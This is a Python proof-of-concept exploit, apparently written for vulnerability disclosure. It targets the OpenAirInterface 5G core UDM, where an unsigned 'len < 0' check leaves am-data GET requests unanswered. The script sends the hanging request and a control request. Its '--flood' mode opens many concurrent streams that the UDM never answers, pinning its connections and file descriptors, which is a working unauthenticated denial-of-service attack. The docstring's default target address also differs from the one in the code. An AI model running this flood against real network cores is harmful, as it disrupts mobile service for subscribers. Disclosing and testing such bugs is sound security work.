#!/usr/bin/env python3
"""PoC: OAI CN5G UDM Nudm_SDM "am-data" GET never responds (hang / silent DoS).

Root cause: in the UDM HTTP/2 (nghttp2-asio) request dispatcher
``oai-udm/src/api_server/udm-http2-server.cpp`` the Access-and-Mobility
Subscription Data Retrieval handler is gated on ``len < 0``::

    request.on_data([&](const uint8_t* data, std::size_t len) {   // len unsigned
        ...
        if (split_q[...].compare(NUDM_AM_DATA) == 0) {
            if (request.method().compare("GET") == 0 && len < 0) {   // ALWAYS FALSE
                ... access_mobility_subscription_data_retrieval_handler(...);
            }
        }

``len`` is a ``std::size_t`` (unsigned), so ``len < 0`` is never true. For a
GET (no body) the handler is therefore never invoked and ``response.end()`` is
never called: the HTTP/2 stream is left open and the client waits forever.
The sibling GET handlers in the same file (sm-data / slice-selection /
smf-select) correctly use ``len == 0`` and respond immediately.

This PoC:
  1. sends GET {supi}/am-data         -> never answered (times out)   [BUG]
  2. sends GET {supi}/sm-data         -> answered in milliseconds     [control]
  3. (optional --flood N) opens N concurrent am-data GETs and shows the UDM
     keeps N HTTP/2 streams / FDs pinned until the clients give up.

Environment:
  UDM_IP    (default 172.30.0.7)   UDM SBI address on demo-oai-public-net
  UDM_PORT  (default 8080)
  SUPI      (default imsi-208950000000037)
Requires: python3 + h2 (pip install h2 hpack hyperframe).
"""
import os
import socket
import sys
import threading
import time

import h2.config
import h2.connection
import h2.events

UDM_IP = os.environ.get("UDM_IP", "172.20.0.8")
UDM_PORT = int(os.environ.get("UDM_PORT", "8080"))
SUPI = os.environ.get("SUPI", "imsi-208950000000037")


def h2_get(host, port, path, timeout=6.0, body=None):
    """Minimal HTTP/2 prior-knowledge (h2c) GET. Returns (status, elapsed, err)."""
    data = b"" if body is None else body.encode()
    headers = [
        (":method", "GET" if body is None else "POST"),
        (":scheme", "http"),
        (":authority", f"{host}:{port}"),
        (":path", path),
        ("user-agent", "udm-amdata-poc/1.0"),
        ("accept", "application/json"),
    ]
    if body is not None:
        headers += [("content-type", "application/json"),
                    ("content-length", str(len(data)))]
    sock = socket.create_connection((host, port), timeout=timeout)
    sock.settimeout(timeout)
    conn = h2.connection.H2Connection(
        config=h2.config.H2Configuration(client_side=True, header_encoding="utf-8"))
    state = {"status": 0, "done": False, "err": None}

    conn.initiate_connection()
    sock.sendall(conn.data_to_send())

    def receiver():
        try:
            while True:
                raw = sock.recv(65535)
                if not raw:
                    break
                for ev in conn.receive_data(raw):
                    if isinstance(ev, h2.events.ResponseReceived):
                        for k, v in ev.headers:
                            if k == ":status":
                                state["status"] = int(v)
                    elif isinstance(ev, h2.events.DataReceived):
                        conn.acknowledge_received_data(
                            ev.flow_controlled_length, ev.stream_id)
                    elif isinstance(ev, (h2.events.StreamEnded, h2.events.StreamReset,
                                         h2.events.ConnectionTerminated)):
                        state["done"] = True
                out = conn.data_to_send()
                if out:
                    sock.sendall(out)
        except Exception as e:  # noqa
            state["err"] = f"{type(e).__name__}: {e}"
        finally:
            state["done"] = True

    t = threading.Thread(target=receiver, daemon=True)
    t.start()
    conn.send_headers(1, headers, end_stream=(len(data) == 0))
    if data:
        conn.send_data(1, data, end_stream=True)
    sock.sendall(conn.data_to_send())

    t0 = time.time()
    while not state["done"] and time.time() - t0 < timeout:
        time.sleep(0.02)
    elapsed = time.time() - t0
    try:
        sock.close()
    except Exception:
        pass
    return state["status"], elapsed, state["err"]


def main():
    flood = 0
    if len(sys.argv) > 1 and sys.argv[1] == "--flood":
        flood = int(sys.argv[2]) if len(sys.argv) > 2 else 20

    base = f"/nudm-sdm/v1/{SUPI}"
    print(f"[*] Target UDM SBI: http://{UDM_IP}:{UDM_PORT}  SUPI={SUPI}")

    print("\n[1] GET am-data  (vulnerable handler, gate 'len < 0'):")
    st, el, err = h2_get(UDM_IP, UDM_PORT, f"{base}/am-data", timeout=6)
    print(f"    status={st or 'NONE'}  elapsed={el:.2f}s  err={err}")
    print("    -> NO HTTP response; stream left open until client timeout  [BUG]")

    print("\n[2] GET sm-data  (sibling handler, correct gate 'len == 0') [control]:")
    st, el, err = h2_get(UDM_IP, UDM_PORT, f"{base}/sm-data", timeout=6)
    print(f"    status={st}  elapsed={el:.3f}s  err={err}")
    print("    -> answered immediately; proves the UDM is up and serving")

    if flood:
        print(f"\n[3] Holding {flood} concurrent am-data GETs open (resource pinning):")
        held = []
        lock = threading.Lock()

        def hold(i):
            s = socket.create_connection((UDM_IP, UDM_PORT), timeout=15)
            s.settimeout(15)
            c = h2.connection.H2Connection(
                config=h2.config.H2Configuration(client_side=True,
                                                 header_encoding="utf-8"))
            c.initiate_connection()
            s.sendall(c.data_to_send())
            c.send_headers(1, [(":method", "GET"), (":scheme", "http"),
                               (":authority", f"{UDM_IP}:{UDM_PORT}"),
                               (":path", f"{base}/am-data"),
                               ("user-agent", "flood"), ("accept", "application/json")],
                         end_stream=True)
            s.sendall(c.data_to_send())
            with lock:
                held.append(s)

        threads = [threading.Thread(target=hold, args=(i,)) for i in range(flood)]
        for th in threads:
            th.start()
        for th in threads:
            th.join()
        print(f"    {len(held)} connections established, each pinning an open "
              f"HTTP/2 stream on the UDM (no response ever sent).")
        print("    Check UDM FDs:  docker exec oai-udm sh -c 'ls /proc/1/fd | wc -l'")
        time.sleep(3)
        for s in held:
            try:
                s.close()
            except Exception:
                pass
        print("    (connections closed; FDs are reclaimed only when the client drops)")

    print("\n[*] Done. The am-data GET is never answered regardless of SUPI/query,")
    print("    pre-auth and unauthenticated over the SBI network.")


if __name__ == "__main__":
    main()
